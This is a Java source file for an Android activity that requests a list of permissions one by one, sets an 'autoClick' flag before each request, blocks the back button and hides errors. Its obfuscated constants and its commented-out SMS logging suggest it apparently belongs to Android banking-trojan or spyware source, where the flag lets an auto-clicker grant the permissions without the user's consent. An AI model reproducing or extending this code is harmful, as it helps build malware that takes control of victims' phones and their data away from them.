package com.service.app.Main;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.KeyEvent;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.service.app.Services.utils;
import com.service.app.defines;


public class PermManager extends Activity {
    public static final int PERMISSION_REQUEST_CODE = 123;
    defines consts = new defines();
    utils utl= new utils();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            utl.SettingsWrite(this, consts.autoClick, consts.str_1);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {



                for (String perm : consts.arrayPermission) {
                    if (!(checkCallingOrSelfPermission(perm) == PackageManager.PERMISSION_GRANTED)) {
                        utl.SettingsWrite(this, consts.autoClick, consts.str_1);
                        requestPermissions(new String[]{perm}, PERMISSION_REQUEST_CODE);
                    }
                }




            }
        }catch (Exception ex){
          //  utl.SettingsToAdd(this, consts.LogSMS , consts.string_141 + ex.toString() +consts.string_119);
        }
        finish();
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        return keyCode == KeyEvent.KEYCODE_BACK || super.onKeyDown(keyCode, event);
    }
    @Override
    protected void onResume() {
        super.onResume();
    }
    @Override
    protected void onStop() {
        super.onStop();
    }
    @Override
    protected void onDestroy() {
        super.onDestroy();
    }
    @Override
    protected void onPause() {
        super.onPause();
    }
}
